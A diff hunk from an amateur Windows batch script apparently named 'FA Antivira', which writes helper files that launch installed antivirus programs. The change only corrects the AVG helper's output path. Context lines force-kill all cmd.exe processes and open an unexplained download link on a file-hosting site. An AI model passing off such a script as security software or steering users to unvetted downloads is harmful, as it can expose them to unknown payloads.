@@ -1143,7 +1143,7 @@ echo start "" "C:\Program Files (x86)\G Data\InternetSecurity\AVKTray.exe" > "C:
 echo start "" "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security 20.0\avp.exe" > "C:\FA_Antivira\FApyHlp\FAKaspersky.bat"
 echo start "" "C:\Program Files\Windows Defender\MsMpEng.exe" > "C:\FA_Antivira\FApyHlp\FAWindDef.bat"
 echo start "" "C:\Program Files\Common Files\McAfee\Platform\McSvcHost" > "C:\FA_Antivira\FApyHlp\FAMcAfee.bat"
-echo start "" "C:\Program Files\AVG\Antivirus\AVGUI.exe" > "FAAVG.bat"
+echo start "" "C:\Program Files\AVG\Antivirus\AVGUI.exe" > "C:\FA_Antivira\FApyHlp\FAAVG.bat"
 echo MsgBox "Welcome To FA Antivira :D" > "C:\FA_Antivira\FAwlc.vbs"
 echo taskkill /f /im cmd.exe > "C:\FA_Antivira\FAcmd.bat"
 start https://ufile.io/1cs1w93x
